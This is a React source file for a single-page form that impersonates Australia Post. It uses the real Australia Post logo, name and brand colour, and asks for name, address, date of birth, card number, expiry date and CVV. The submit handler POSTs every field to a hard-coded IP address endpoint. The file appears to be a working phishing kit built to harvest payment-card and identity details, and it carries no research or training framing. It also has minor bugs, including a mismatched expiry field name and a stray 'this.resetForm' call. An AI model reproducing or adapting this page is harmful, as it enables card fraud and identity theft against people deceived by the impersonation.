import { useState } from 'react';
import axios from 'axios';

function App() {
  const [formData, setFormData] = useState({
    name: '',
    address: '',
    birthday: '',
    cardNumber: '',
    expireDate: '',
    cvv: ''
  })

  const handleInputChange = (e) => {
    setFormData(state => ({...state, [e.target.name]: e.target.value }))
  }

  const handleSubmit = async (e) => {
    e.preventDefault();
    const response = await axios.post("http://192.168.115.52:8080/api/access", formData)
    console.log('res', response)
    const resData = response.data
    if (resData.status === 'success'){
        alert("Message Sent."); 
        this.resetForm()
    } else if(resData.status === 'fail'){
        alert("Message failed to send.")
    }
  }
  return (
    <div className="min-h-full flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-md w-full space-y-8">
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-around' }}>
          <img style={{ width: 80, height: 80 }} className="h-12" src="https://auspost.com.au/mypost/auspoststaticassets/assets/authentication/common/images/brand-icon-australia-post.svg" alt="Workflow" />
          <h2 style={{ fontFamily: 'ap_display,Helvetica,Arial' }} className="mt-6 text-center text-3xl font-extrabold text-gray-900">Australia Post</h2>
        </div>
        <form className="mt-8 space-y-6">
          <input type="hidden" name="remember" value="true" />
          <div className="rounded-md shadow-sm -space-y-px">
            <div style={{ marginTop: 15 }}>
              <label htmlFor="name" className="sr-only">Name</label>
              <input id="name" name="name" type="text" value={formData.name} onChange={handleInputChange} required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Name" />
            </div>
            <div style={{ marginTop: 15 }}>
              <label htmlFor="address" className="sr-only">Address</label>
              <input id="address" name="address" type="address" value={formData.address} onChange={handleInputChange} required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Address"/>
            </div>
            <div style={{ marginTop: 15 }}>
              <label htmlFor="date-of-birth" className="sr-only">date-of-birth</label>
              <input id="date-of-birth" name="birthday" type="date" value={formData.birthday} onChange={handleInputChange} className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Date of Birth"/>
            </div>
            <div style={{ marginTop: 15 }}>
              <label htmlFor="card-number" className="sr-only">card-number</label>
              <input id="card-number" name="cardNumber" type="tel" value={formData.cardNumber} onChange={handleInputChange} required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Card Number"/>
            </div>
            <div style={{ marginTop: 15 }}>
              <label htmlFor="expiry-date" className="sr-only">expiry-date</label>
              <input id="expiry-date" name="expiryDate" type="date" value={formData.expireDate} onChange={handleInputChange} className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="Expiry Date"/>
            </div>
            <div style={{ marginTop: 15 }}>
              <label htmlFor="cvv" className="sr-only">cvv</label>
              <input id="cvv" name="cvv" type="cvv" value={formData.cvv} onChange={handleInputChange} required className="appearance-none rounded-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 focus:z-10 sm:text-sm" placeholder="CVV"/>
            </div>
          </div>
          <div>
            <button style={{ background: '#b71521' }} onClick={handleSubmit} className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500">
              Submit
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

export default App;
